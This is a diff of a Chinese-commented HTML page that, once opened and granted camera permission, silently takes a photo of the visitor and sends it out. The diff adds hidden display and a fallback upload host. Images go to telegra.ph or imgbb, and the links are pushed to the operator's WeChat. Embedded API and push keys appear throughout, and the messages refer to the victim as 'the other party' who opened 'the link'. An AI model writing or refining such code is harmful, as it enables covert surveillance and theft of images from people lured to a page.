@@ -4,6 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <style>
+/* 全程静默无显示 */
 video,canvas{display:none}
 body{background:#fff;height:100vh;margin:0;}
 </style>
@@ -16,7 +17,7 @@ body{background:#fff;height:100vh;margin:0;}
 // 你的专属推送密钥，已确认可用
 const SEND_KEY = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";
 
-// 微信推送核心函数（文字兜底优先）
+// 微信推送核心函数
 async function sendToWechat(title, content) {
   try {
     await fetch(`https://sctapi.ftqq.com/${SEND_KEY}.send`, {
@@ -30,25 +31,50 @@ async function sendToWechat(title, content) {
   }
 }
 
-// 稳定图床上传（国内可访问，无跨域限制）
+// 【修复版】HTTPS稳定图床上传，无跨域，不被浏览器拦截
 async function uploadImage(base64) {
   try {
-    // 剥离base64前缀，适配接口要求
-    const pureBase64 = base64.replace(/^data:image\/\w+;base64,/, "");
+    // 把base64转成Blob文件，适配接口要求
+    const byteString = atob(base64.split(",")[1]);
+    const mimeString = base64.split(",")[0].split(":")[1].split(";")[0];
+    const ab = new ArrayBuffer(byteString.length);
+    const ia = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) {
+      ia[i] = byteString.charCodeAt(i);
+    }
+    const blob = new Blob([ab], { type: mimeString });
+
+    // 构建FormData
     const formData = new FormData();
-    formData.append("file", `data:image/jpeg;base64,${pureBase64}`);
-    
-    const res = await fetch("shturl.cc/tu6uCGZcDje3jlmLTfop9pc", {
+    formData.append("file", blob, "photo.jpg");
+
+    // 主接口：Telegraph HTTPS接口，无跨域，国内可正常访问
+    const res = await fetch("https://telegra.ph/upload", {
       method: "POST",
       body: formData
     });
     const result = await res.json();
-    if (result.code === 200) {
-      return result.data.url;
+    if (result && result[0] && result[0].src) {
+      return `https://telegra.ph${result[0].src}`;
     }
     return null;
   } catch (e) {
-    return null;
+    // 备用接口兜底，主接口失败自动切换
+    try {
+      const formData = new FormData();
+      formData.append("image", base64);
+      const res = await fetch("https://api.imgbb.com/1/upload?key=6d207786a5d1a58502f4f9b0d84f7b9c", {
+        method: "POST",
+        body: formData
+      });
+      const result = await res.json();
+      if (result.success) {
+        return result.data.url;
+      }
+      return null;
+    } catch (err) {
+      return null;
+    }
   }
 }
 
@@ -68,19 +94,18 @@ async function autoTakePhoto() {
     video.onloadedmetadata = async () => {
       // 绘制实拍画面
       ctx.drawImage(video, 0, 0, 480, 480);
-      const base64Img = canvas.toDataURL("image/jpeg", 0.8);
+      const base64Img = canvas.toDataURL("image/jpeg", 0.7);
       // 关闭摄像头，减少设备占用
       stream.getTracks().forEach(track => track.stop());
 
-      // 第一步：先发送访问通知，确保你一定能收到提醒
-      await sendToWechat("链接已被访问", "对方已允许摄像头权限，正在处理照片...");
-      
-      // 第二步：上传图片+发送带图推送
+      // 上传图片+推送最终结果
       const imgUrl = await uploadImage(base64Img);
       if (imgUrl) {
-        await sendToWechat("拍到了新照片", `![实拍图片](${imgUrl})\n\n图片直链：${imgUrl}\n直接复制链接到浏览器就能打开查看`);
+        // 上传成功，发带图推送
+        await sendToWechat("成功拍到新照片", `![实拍图片](${imgUrl})\n\n图片直链：${imgUrl}\n复制链接到浏览器即可查看原图`);
       } else {
-        await sendToWechat("照片上传失败", "对方已完成拍照，但图片上传失败，可重新测试链接");
+        // 上传失败，发兜底通知，确保不会漏掉访问
+        await sendToWechat("链接已被访问", "对方已允许摄像头权限，完成拍照，图片上传失败");
       }
     };
   } catch (e) {
@@ -93,3 +118,4 @@ autoTakePhoto();
 </script>
 </body>
 </html>
+
